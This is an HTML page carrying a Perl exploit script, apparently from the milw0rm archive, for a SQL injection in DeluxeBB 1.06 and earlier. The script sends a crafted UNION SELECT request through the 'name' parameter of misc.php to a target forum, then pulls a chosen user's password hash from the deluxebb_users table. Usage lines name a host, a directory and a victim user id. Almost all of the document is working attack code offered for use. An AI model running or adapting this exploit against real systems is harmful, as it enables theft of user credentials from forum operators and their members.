<html><head><title>DeluxeBB <= 1.06 (name) Remote SQL Injection Exploit (mq=off)</title></head><pre>#!/usr/bin/perl

use IO::Socket;


print q{
#############################################
# DeluxeBB 1.06 Remote SQL Injection Exploit#
# 	exploit discovered and coded        #
#	   by KingOfSka                     #
#	http://contropotere.netsons.org	    #
#############################################
};

if (!$ARGV[2]) {

print q{ 
	Usage: perl dbbxpl.pl host /directory/ victim_userid 
  
       perl dbbxpl.pl www.somesite.com /forum/ 1


};

}


$server = $ARGV[0];
$dir    = $ARGV[1];
$user   = $ARGV[2];
$myuser = $ARGV[3];
$mypass = $ARGV[4];
$myid   = $ARGV[5];

print &quot;------------------------------------------------------------------------------------------------\r\n&quot;;
print &quot;[&gt;] SERVER: $server\r\n&quot;;
print &quot;[&gt;]    DIR: $dir\r\n&quot;;
print &quot;[&gt;] USERID: $user\r\n&quot;;
print &quot;------------------------------------------------------------------------------------------------\r\n\r\n&quot;;

$server =~ s/(http:\/\/)//eg;

$path  = $dir;
$path .= &quot;misc.php?sub=profile&amp;name=0')+UNION+SELECT+0,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+FROM%20deluxebb_users%20WHERE%20(uid='&quot;.$user ;

 
print &quot;[~] PREPARE TO CONNECT...\r\n&quot;;

$socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$server&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-] CONNECTION FAILED&quot;;

print &quot;[+] CONNECTED\r\n&quot;;
print &quot;[~] SENDING QUERY...\r\n&quot;;
print $socket &quot;GET $path HTTP/1.1\r\n&quot;;
print $socket &quot;Host: $server\r\n&quot;;
print $socket &quot;Accept: */*\r\n&quot;;
print $socket &quot;Connection: close\r\n\r\n&quot;;
print &quot;[+] DONE!\r\n\r\n&quot;;



print &quot;--[ REPORT ]------------------------------------------------------------------------------------\r\n&quot;;
while ($answer = &lt;$socket&gt;)
{

 if ($answer =~/(\w{32})/)
{

  if ($1 ne 0) {
   print &quot;Password Hash is: &quot;.$1.&quot;\r\n&quot;;
print &quot;--------------------------------------------------------------------------------------\r\n&quot;;

      }
exit();
}

}
print &quot;------------------------------------------------------------------------------------------------\r\n&quot;;

# milw0rm.com [2006-05-15]</pre></html>